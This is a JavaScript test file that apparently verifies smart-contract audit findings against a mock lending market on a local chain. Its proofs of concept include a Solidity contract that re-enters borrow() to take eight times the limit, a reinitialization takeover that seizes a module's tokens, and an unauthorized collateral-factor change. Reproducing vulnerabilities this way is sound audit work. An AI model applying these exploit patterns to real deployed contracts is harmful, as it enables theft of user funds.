import assert from "node:assert/strict";
import { before, test } from "node:test";
import {
  compileAll,
  deploy,
  ether,
  expectRevert,
  makeChain,
  send
} from "../target/test/support.mjs";

const deepBorrowSource = `
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IMarketReviewerA {
    function borrow(uint256 amount, address receiver, bytes calldata data) external;
}

contract DeepBorrowReviewerA {
    IMarketReviewerA public immutable market;
    uint256 private callsRemaining;

    constructor(IMarketReviewerA market_) { market = market_; }

    function attack(uint256 amount, uint256 nestedCalls) external {
        callsRemaining = nestedCalls;
        market.borrow(amount, address(this), hex"01");
    }

    function onBorrow(address, uint256 amount, bytes calldata) external {
        require(msg.sender == address(market), "MARKET");
        if (callsRemaining != 0) {
            callsRemaining--;
            market.borrow(amount, address(this), hex"01");
        }
    }
}
`;

let artifacts;

before(async () => {
  artifacts = await compileAll({
    additionalSources: {
      "review-output/DeepBorrowReviewerA.sol": deepBorrowSource
    }
  });
});

async function deployMarket() {
  const chain = await makeChain();
  const [guardian, attacker] = chain.signers;
  const asset = await deploy(artifacts, "MockERC20", guardian, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", guardian, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", guardian, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", guardian, [await asset.getAddress(), await stable.getAddress()]);
  const feed = await deploy(artifacts, "MockFeed", guardian, [8, 100_000_000]);
  const oracle = await deploy(artifacts, "ReserveOracle", guardian, [await feed.getAddress(), await pool.getAddress()]);
  const market = await deploy(artifacts, "LendingMarket", guardian, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await guardian.getAddress()
  ]);
  await send(stable.mint(await market.getAddress(), ether(10_000)));
  return { guardian, attacker, asset, stable, vault, market };
}

async function collateralize(context, beneficiary) {
  const attackerAddress = await context.attacker.getAddress();
  await send(context.asset.mint(attackerAddress, ether(1_000)));
  await send(context.asset.connect(context.attacker).approve(await context.vault.getAddress(), ether(1_000)));
  await send(context.vault.connect(context.attacker).deposit(ether(1_000), attackerAddress));
  await send(context.vault.connect(context.attacker).approve(await context.market.getAddress(), ether(1_000)));
  await send(context.market.connect(context.attacker).depositCollateral(ether(1_000), beneficiary));
}

test("C-001 discriminant: stale-debt callback can repeat beyond two frames", async () => {
  const context = await deployMarket();
  const callback = await deploy(artifacts, "DeepBorrowReviewerA", context.attacker, [await context.market.getAddress()]);
  const callbackAddress = await callback.getAddress();
  await collateralize(context, callbackAddress);

  const limit = await context.market.borrowLimit(callbackAddress);
  await send(callback.connect(context.attacker).attack(limit, 7));

  const debt = await context.market.debt(callbackAddress);
  const received = await context.stable.balanceOf(callbackAddress);
  assert.equal(limit, ether(750));
  assert.equal(debt, ether(6_000));
  assert.equal(received, debt);
  assert.equal(debt, limit * 8n);
  console.log(JSON.stringify({
    check: "C-001-depth",
    borrowLimit: String(limit),
    frames: "8",
    debt: String(debt),
    stableReceived: String(received)
  }));
});

test("C-005 discriminant: reinitialization also grants the arbitrary-call vault role", async () => {
  const chain = await makeChain();
  const [admin, operator, attacker] = chain.signers;
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const module = await deploy(artifacts, "StrategyModule", admin);
  const attackerAddress = await attacker.getAddress();
  await send(module.initialize(await admin.getAddress(), await operator.getAddress()));
  await send(token.mint(await module.getAddress(), ether(10)));

  const transferCall = token.interface.encodeFunctionData("transfer", [attackerAddress, ether(10)]);
  await expectRevert(module.connect(attacker).execute(await token.getAddress(), transferCall));
  await send(module.connect(attacker).initialize(attackerAddress, attackerAddress));
  await send(module.connect(attacker).execute(
    await token.getAddress(), transferCall, { gasLimit: 1_000_000 }
  ));

  assert.equal(await token.balanceOf(await module.getAddress()), 0n);
  assert.equal(await token.balanceOf(attackerAddress), ether(10));
  console.log(JSON.stringify({
    check: "C-005-execute",
    preSeizureExecuteRejected: true,
    postSeizureExecuteSucceeded: true,
    attackerToken: String(await token.balanceOf(attackerAddress))
  }));
});

test("C-006 discriminant: parameter bypass raises risk but remains nominally collateralized at the static price", async () => {
  const context = await deployMarket();
  const attackerAddress = await context.attacker.getAddress();
  await collateralize(context, attackerAddress);

  await send(context.market.connect(context.attacker).setCollateralFactor(9_500));
  await send(context.market.connect(context.attacker).borrow(ether(949), attackerAddress, "0x"));

  const collateralValue = await context.market.collateralValue(attackerAddress);
  const debt = await context.market.debt(attackerAddress);
  assert.equal(collateralValue, ether(1_000));
  assert.equal(debt, ether(949));
  assert(debt < collateralValue);
  console.log(JSON.stringify({
    check: "C-006-static-solvency",
    collateralValue: String(collateralValue),
    debt: String(debt),
    immediateShortfall: "0",
    priceDropToInsolvencyBps: "510"
  }));
});
